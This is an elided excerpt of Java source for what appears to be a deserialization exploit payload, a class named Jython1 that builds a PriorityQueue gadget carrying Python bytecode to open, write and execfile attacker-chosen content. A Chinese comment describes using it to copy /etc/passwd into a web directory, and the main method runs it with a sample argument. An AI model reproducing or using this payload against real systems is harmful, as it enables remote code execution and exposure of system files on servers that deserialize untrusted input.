...
public class Jython1 extends PayloadRunner implements ObjectPayload<PriorityQueue> {
    ...
    public PriorityQueue getObject(String command) throws Exception {
        ...
        PyObject[] consts = new PyObject[]{new PyString(""), new PyString(paths[1]), new PyString("w+"),
            new PyString(python_code)};
        String[] names = new String[]{"open", "write", "close", "execfile"};

        // Generating PyBytecode wrapper for our python bytecode
        PyBytecode codeobj = new PyBytecode(2, 2, 10, 64, "", consts, names, new String[]{"", ""}, "noname", "<module" +
            ">", 0, "");
...
//        把某个文件copy到另外个目录文件中，例如：copy  /etc/passwd 到web目录下。
        PayloadRunner.run(Jython1.class, new String[]{"./ahi.txt;xxx"});
    }
}
